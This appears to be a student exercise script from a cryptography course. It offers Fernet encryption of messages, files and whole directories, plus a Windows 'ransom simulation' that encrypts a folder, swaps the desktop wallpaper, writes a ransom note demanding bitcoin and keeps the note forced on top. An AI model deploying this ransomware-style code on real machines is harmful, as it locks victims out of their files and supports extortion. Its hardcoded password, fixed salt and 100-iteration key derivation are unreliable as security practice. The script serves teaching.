#!/bin/python

# Import Libraries

import os
import sys #to install the requirements
import base64
import urllib.request # used for downloading and saving background image
import ctypes # so we can interact with windows dlls and change windows background etc
import datetime # to give time limit on ransom note
import subprocess # to install requirements and create process for notepad and open ransom note
import time # used to time.sleep interval for ransom note


required_packages = [
    "cryptography>=3.4",
    "pywin32>=300" # For win32gui for the ransom note
]

for package in required_packages:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# These libraries can only be imported after the requirements are installed
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from win32 import win32gui # used to get window text to see if ransom note is on top of all other windows

# Declare Functions

def write_key():
    # Generates a key and save it into a file
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    # Loads the key from the current directory named `key.key`
    return open("key.key", "rb").read()

def encrypt_file(key, file_name):

    print("\nThe file {} is being encrypted.".format(file_name))

    # Initialize the Fernet class
    f = Fernet(key)

    with open(file_name, "rb") as file:
        file_data = file.read()

    # Encrypt the data from the file
    encrypted_data = f.encrypt(file_data)

    # Substitute the original file, by the file encrypted
    with open(file_name, "wb") as file:
        file.write(encrypted_data) 

    print("\nThe file {} is now encrypted.".format(file_name))

def decrypt_file(key, file_name):
    
    print("\nThe file {} is being decrypted.".format(file_name))

    # Initialize the Fernet class
    f = Fernet(key)

    with open(file_name, "rb") as file:
        encrypted_data = file.read()

    decrypted_data = f.decrypt(encrypted_data)

    # Substitute the original file, by the file decrypted
    with open(file_name, "wb") as file:
        file.write(decrypted_data)

    print("\nYour file {} is now decrypted.".format(file_name)) 

def change_desktop_background():
    imageUrl = "https://raw.githubusercontent.com/roberta-vieira/ICC-02-personal-repo/refs/heads/main/exercises/class37-cryptography/ransomware_image.webp"
    # Go to specif url and download+save image using absolute path
    path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'background.webp')  # Auto-detects user's desktop
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def ransom_note():
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The secrets of your computer have been encrypted.
There is no way to restore your data without a special key.
Only WE can decrypt your files!
YOU HAVE 8h TO MAKE THE PAYMENT.

To restore your data, please follow these three easy steps:

1. Send an email to mean_hacker@protonmail.com.

2. You will recieve your personal BTC address for payment.
   Once payment has been completed, send another email to mean_hacker@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   
WARNING:
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" email without paying, price WILL go up for disobedience.
Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
                    
IMPORTANT: To decrypt your files, as this is only a simulation, run the script again and choose option 6. Shortly after it will begin to decrypt all files.

''')
            
def show_ransom_note():
    # Open the ransom note
    ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
    count = 0 # Debugging/Testing
    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'RANSOM_NOTE - Notepad':
            #print('Ransom note is the top window - do nothing') # Debugging/Testing
            pass
        else:
            #print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
            # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
            time.sleep(0.1)
            ransom.kill()
            # Open the ransom note
            time.sleep(0.1)
            ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        # sleep for 10 seconds
        time.sleep(10)
        count +=1 
        if count == 5:
            break

# Main
option_1 = '1- Encrypt Message'
option_2 = '2- Decrypt Message'
option_3 = '3- Encrypt File'
option_4 = '4- Decrypt File'
option_5 = '5- Encrypt all the Files in a directory'
option_6 = '6- Decrypt all the Files in a directory'
option_7 = '7- Encrypt File with PBKDF2'
option_8 = '8- Encrypt File with PBKDF2'
option_9 = '9- Ransom Simulation (Windows)' 
print('''
      
      
            Menu Options:
{}
{}
{}
{}
{}
{}
{}
{}
{}      
      
PBKDF2: password-based key derivation function       
'''.format(option_1, option_2, option_3, option_4, option_5, option_6, option_7, option_8, option_9))

menu_option = input("Please choose the desired menu option (1-9): ") 

if menu_option == '1':
    print("\n---------------------------------------------------------\n", option_1)
    # Generate and write a new key
    write_key()

    # Load the previously generated key
    key = load_key()

    message = input("\nPlease write the message you whish to encrypt: ").encode()
    #print("Plaintext is " + str(message.decode('utf-8')))
    #Dream big, work hard

    # Initialize the Fernet class
    f = Fernet(key)

    # Encrypt the message
    encrypted = f.encrypt(message)

    # Print how it looks
    print("Ciphertext is " + encrypted.decode('utf-8'))

elif menu_option == '2':
    print("\n---------------------------------------------------------\n", option_2)
    print("Your key should be saved in a file named key.key.")

    # Load the previously generated key
    key = load_key()

    # Initialize the Fernet class
    f = Fernet(key)
    
    # Receive the encrypted message and convert to bytes
    message_to_decrypt = input("\nPlease write the encrypted message: ").encode('utf-8')

    decrypted = f.decrypt(message_to_decrypt).decode('utf-8')

    print("\nYour encrypted message was:", decrypted)

elif menu_option == '3':
    print("\n---------------------------------------------------------\n", option_3)
    # Generate and write a new key
    write_key()

    # Load the previously generated key
    key = load_key()

    file_name = input("\nPlease write the file name you want to encrypt: ")

    encrypt_file(key, file_name)


elif menu_option == '4':
    print("\n---------------------------------------------------------\n", option_4)
    print("\nYour key should be saved in a file named key.key.")

    # Load the key
    key = load_key()

    file_name = input("\nPlease write the file name you want to decrypt: ")

    decrypt_file(key, file_name)

elif menu_option == '5':
    print("\n---------------------------------------------------------\n", option_5)
    path = input("Please write the full path to the directory where you want to encrypt all the files: ")

    dir_list = os.listdir(path)
    print("These are the files in your your path '{}':\n{} ".format(path, dir_list))

    # Generate and write a new key
    write_key()

    # Load the previously generated key
    key = load_key()

    for file_name in dir_list:
        file_name = path + '/' + file_name
        encrypt_file(key, file_name)

elif menu_option == '6':
    print("\n---------------------------------------------------------\n", option_6)
    path = input("Please write the full path to the directory where you want to decrypt all the files: ")

    dir_list = os.listdir(path)
    print("These are the files in your your path '{}':\n{} ".format(path, dir_list))

    # Load the key
    key = load_key()

    for file_name in dir_list:
        file_name = path + '/' + file_name
        decrypt_file(key, file_name)

elif menu_option == '7':
    print("\n---------------------------------------------------------\n", option_7)
    password = b'my password is unbreakable'
    salt = b'fixed salt'

    # Create the hash function that will create the key
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100,
    )
    # Convert the key to the format expected from Fernet
    key = base64.urlsafe_b64encode(kdf.derive(password))
    
    file_name = input("\nPlease write the file name you want to decrypt: ")

    encrypt_file(key,file_name)

elif menu_option == '8':
    print("\n---------------------------------------------------------\n", option_8)
    password = b'my password is unbreakable'
    salt = b'fixed salt'
    password_user = input("\nPlease enter the password: ").encode('utf-8')

    # Create the hash function to derive the original key
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100,
    )

    key_kdf = kdf.derive(password)

    # New kdf instance for verification, because it can be used only once
    kdf_verify = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100,
    )

    try:
        # Verifying if the key match
        kdf_verify.verify(password_user, key_kdf)

        # Convert the key to the format expected from Fernet
        key = base64.urlsafe_b64encode(key_kdf)

        file_name = input("\nPlease write the file name you want to decrypt: ")
        decrypt_file(key, file_name)
    except Exception:
        print("\nYour password is incorrect.")

elif menu_option == '9':
    print("\n---------------------------------------------------------\n", option_9)
    path = "./secret"

    dir_list = os.listdir(path)
    print("These are the files in your your path '{}':\n{} ".format(path, dir_list))

    # Generate and write a new key
    write_key()

    # Load the previously generated key
    key = load_key()

    for file_name in dir_list:
        file_name = path + '/' + file_name
        encrypt_file(key, file_name)

    # Change the desktop background
    change_desktop_background()

    # Write the ransom note
    ransom_note()

    # Show the ransom note on the top of the screen
    show_ransom_note()
else:
    print("\nYou did not choose an available option. Goodbye!")



